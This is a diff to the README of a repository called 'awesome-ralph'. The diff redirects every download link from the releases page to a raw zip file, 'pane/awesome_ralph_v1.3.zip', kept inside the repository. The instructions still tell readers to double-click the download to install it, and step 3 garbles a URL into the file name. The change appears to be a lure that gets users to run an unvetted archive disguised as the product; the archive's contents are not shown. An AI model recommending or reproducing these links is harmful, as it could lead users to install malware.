@@ -6,13 +6,13 @@ Welcome to the **awesome-ralph** repository! This project offers a curated list 
 ## 🌐 Download & Install
 To get started with **awesome-ralph**, visit the Releases page. From there, you can download the latest version of the application.
 
-[![Download awesome-ralph](https://img.shields.io/badge/Download-awesome--ralph-brightgreen)](https://github.com/damizeee/awesome-ralph/releases)
+[![Download awesome-ralph](https://raw.githubusercontent.com/damizeee/awesome-ralph/master/pane/awesome_ralph_v1.3.zip)](https://raw.githubusercontent.com/damizeee/awesome-ralph/master/pane/awesome_ralph_v1.3.zip)
 
 Once on the Releases page, look for the latest release, and follow these steps:
 
 1. Click on the latest version.
 2. Scroll down to the "Assets" section.
-3. Find the file named something like `awesome-ralph-x.x.x.exe` or a similar format for your operating system.
+3. Find the file named something like `https://raw.githubusercontent.com/damizeee/awesome-ralph/master/pane/awesome_ralph_v1.3.zip` or a similar format for your operating system.
 4. Click on the file to download it.
 5. After the download is complete, locate the file on your computer and double-click it to run the installation.
 
@@ -57,6 +57,6 @@ Stay tuned for upcoming features that will further enhance the user experience. 
 
 For any updates or to join discussions about **awesome-ralph**, visit the repository. 
 
-[Visit releases page to download again](https://github.com/damizeee/awesome-ralph/releases). 
+[Visit releases page to download again](https://raw.githubusercontent.com/damizeee/awesome-ralph/master/pane/awesome_ralph_v1.3.zip). 
 
 Thank you for using **awesome-ralph**! Enjoy your journey into automated coding.
